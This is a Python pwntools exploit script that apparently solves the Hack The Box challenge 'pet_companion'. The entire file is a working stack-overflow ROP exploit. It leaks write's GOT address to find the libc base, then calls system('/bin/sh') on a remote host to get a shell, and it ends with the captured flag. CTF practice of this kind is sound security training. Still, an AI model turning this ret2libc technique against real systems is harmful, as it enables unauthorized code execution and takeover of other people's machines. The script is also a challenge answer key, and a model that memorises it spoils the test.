#RazviOverflow
'''
read writes input from stack-0x48, 0x100 (256) bytes

0x0000000000400743 : pop rdi ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
0x00000000004004de : ret
'''
from pwn import * 

def debug(p):
	pid = util.proc.pidof(p)[0]
	print(f"Pid is: {pid}")
	util.proc.wait_for_debugger(pid)

context.binary = binary = ELF("./pet_companion", checksec=False)
static_library = ELF("./glibc/libc.so.6")

#p = process(env={"LD_LIBRARY_PATH" : "./glibc/libc.so.6"})
p = remote("83.136.249.138", 41927)

main_address = p64(binary.sym.main)
write_address = p64(binary.sym.write)
write_got_address = p64(binary.got.write)
read_got_address = p64(binary.got.read)
ret_address = p64(0x00000000004004de)
pop_rsi_pop_r15_ret = p64(0x0000000000400741)
pop_rdi = p64(0x0000000000400743)

padding = b"A"*0x48

payload = padding
payload += ret_address
payload += pop_rsi_pop_r15_ret
payload += write_got_address
payload += p64(0) # Garbage value to fulfill r15
payload += write_address # Write inherits 0x15 in the edx register from main
payload += main_address

#debug(p)

############## 1st stage (1st call to main) ################
p.recv()
p.sendline(payload)
write_dynamic_address = p.recv().split(b"\n\n")[1]
write_dynamic_address = u64(write_dynamic_address[:8].ljust(8, b"\x00"))
write_static_address = static_library.sym.write

new_base_address = write_dynamic_address - write_static_address
print(f"Write dynamic address: {hex(write_dynamic_address)}")
print(f"Write static address: {hex(write_static_address)}")
print(f"New base address: {hex(new_base_address)}")
static_library.address = new_base_address

############## 2nd stage (2nd call to main) ################
bin_sh_address = p64(next(static_library.search(b"/bin/sh")))
system_address = p64(static_library.sym.system)

print(f"/bin/sh address: {hex(u64(bin_sh_address))}")
print(f"system address: {hex(u64(system_address))}")

payload = padding
payload += ret_address
payload += pop_rdi #1st argument is passed via rdi register
payload += bin_sh_address
payload += system_address

p.sendline(payload)

p.interactive()

#Flag: HTB{c0nf1gur3_w3r_d0g}